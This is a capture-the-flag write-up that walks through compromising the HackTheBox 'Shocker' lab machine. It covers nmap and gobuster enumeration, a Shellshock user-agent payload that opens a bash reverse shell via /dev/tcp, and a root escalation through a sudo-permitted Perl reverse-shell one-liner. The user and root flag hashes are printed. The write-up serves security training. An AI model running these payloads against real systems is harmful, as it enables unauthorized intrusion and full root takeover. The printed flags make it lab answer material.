---
title: HackTheBox - Shocker w/o Metasploit
publishDate: 2023-09-03
author: Abhinav Kumar
image:   '~/assets/images/htb-shocker.png'
excerpt: HackTheBox Shocker machine is a Linux machine , based on ShellShock Vulnerability ,easy for starters.
draft: false
category: HackTheBox
---

# Shocker

HackTheBox Link to Shocker Machine - [HTB-Shocker](https://app.hackthebox.com/machines/shocker)

The Machine is a simple straight forward machine which is based on ShellShock Vulnerability.

Initial Nmap Scan results shows two open ports 80 (HTTP) , 2222 .
Checking services scan from nmap .

As per below results, we get two ports.

- 80 - Apache httpd 2.4.18
- 2222 - OpenSSH 7.2p2 Ubuntu 4ubuntu2.2

```bash                                                            
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nmap shocker.htb                            
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 21:26 IST
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
2222/tcp open  EtherNetIP-1

Nmap done: 1 IP address (1 host up) scanned in 18.15 seconds
                                                                                                                                                            
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ sudo nmap -sC -sV -A -T5 -p80,2222 shocker.htb
[sudo] password for abhinav: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-03 21:27 IST
Nmap scan report for shocker.htb (10.10.10.56)
Host is up (0.15s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.12 (96%), Linux 3.13 (96%), Linux 3.16 (96%), Linux 3.18 (96%), Linux 3.2 - 4.9 (96%), Linux 3.8 - 3.11 (96%), Linux 4.8 (96%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 2222/tcp)
HOP RTT       ADDRESS
1   147.22 ms 10.10.14.1
2   148.34 ms shocker.htb (10.10.10.56)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.29 seconds
 ```

### Enumeration 

Visiting the IP:80 in browser presents us with an Image that does not means much, checking source code also does not reveals anything.

![HTB-Shocker-Website](~/assets/images/htb-shocker-website.png)

Let us run Gobuster and see if we find anything.
Nothing found.

```bash                               
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ gobuster dir -u  http://shocker.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200            
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shocker.htb/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

The machine name suggests it is vulnerable to ShellShock Vulnerability, where the servers utilize CGI. The common directories that are usually present are /cgi-bin , /cgi-mod , /cgi-sys.

When browsing for /cgi-bin we get a error 404, but with /cgi-bin/ we get 403, indicating that the directory exists but not accessible.

![HTB Shocker /cgi-bin/](~/assets/images/htb-shocker-cgi-bin.png)
Retrying gobuster with -f switch which forces a slash (/) at the end , gives the results as below.


```bash                               
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ gobuster dir -u  http://shocker.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200 -f 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shocker.htb
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Add Slash:               true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cgi-bin/             (Status: 403) [Size: 294]
/icons/               (Status: 403) [Size: 292]
Progress: 87664 / 87665 (100.00%)
===============================================================
Finished
===============================================================
```

Since the presence of /cgi-bin/ directory, let us further search for any scripts present with extension sh,pl,cgi.

```bash
                                                                                                                                                           
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ gobuster dir -u  http://shocker.htb/cgi-bin/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 200 -x sh   
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shocker.htb/cgi-bin/
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sh
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/user.sh              (Status: 200) [Size: 118]
Progress: 175328 / 175330 (100.00%)
===============================================================
Finished
===============================================================
```

We notice we have user.sh at /cgi-bin/user.sh .
User.sh can be downloaded and does not presents with anything valuable.

### Exploit

As per machine name suggesting ShellShock vulnerability, we search for exploitation of vulerability and understand how it works [ShellShock Vulnerability](https://www.infosecarticles.com/exploiting-shellshock-vulnerability/)

Intercepting the request through Burp, below is the request and response in Burpsuite.

![BurpSuite Intercepted Request](~/assets/images/htb-shellshock-burpsuite1.png)

Let us exploit the shellshock Vulnerability , add the below in place of user-agent string and stup a Netcat Listner
Replace the IP and Port as per your own VPN IP, which you can get by - ifconfig tun0 . I have selected port 7777 for now.


```
() { :; }; /bin/bash -i >& /dev/tcp/10.10.14.15/7777 0>&1
```

```bash
nc -nlvp 7777
```

![HTB Shocker ShellShock Vulnerability](~/assets/images/htb-shocker-shellshock.png)

If the above worked, burp will not give any response and we can see instead a shell on our netcat listner.

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nc -nlvp 7777   
listening on [any] 7777 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.56] 54106
bash: no job control in this shell
shelly@Shocker:/usr/lib/cgi-bin$ id
id
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
shelly@Shocker:/usr/lib/cgi-bin$ whoami
whoami
shelly
shelly@Shocker:/usr/lib/cgi-bin$ 
```

Let us get the user flag.

```bash
shelly@Shocker:/usr/lib/cgi-bin$ cat /home/shelly/user.txt
cat /home/shelly/user.txt
0504191b6587b318d2f8a84987acdf6b
shelly@Shocker:/usr/lib/cgi-bin$ 
```

### Privilege Escalation

We will try to escalate privilege , lets check the sudo -l .

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
shelly@Shocker:/usr/lib/cgi-bin$ 
```

This means we can run /usr/bin/perl with sudo privileges without providing password (as NOPASSWD).

Let us search for reverse-shell using Perl [PentestMonkey](https://pentestmonkey.net/tools/web-shells/perl-reverse-shell) and also spin another Netcat Listner on different port.

```
perl -e 'use Socket;$i="10.10.14.15";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Since we are allowed to run perl as sudo, let us use sudo .

```bash
shelly@Shocker:/usr/lib/cgi-bin$ sudo perl -e 'use Socket;$i="10.10.14.15";$p=8888;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
<n(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' 
```

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.56] 37834
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
```

![Root Shell](~/assets/images/htb-shocker-root.png)

We can see in the screenshot, we have got root shell (#).
Let us get the root flag.

```bash
┌──(abhinav㉿ETHICALHACKX)-[~]
└─$ nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.15] from (UNKNOWN) [10.10.10.56] 37834
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
e9e371fd072ccff301a9492019421341
# 
```

## Learnings

1- How to Exploit shellshock Vulnerability, to check we can also use NSE scripts from Nmap.
2- Gobuster option -x helps enumerate file extensions, -f adds a trailing slash / at end , which can result into different results.
3- Always check what programs/scripts can be run with users with higher privilleges (sudo -l)

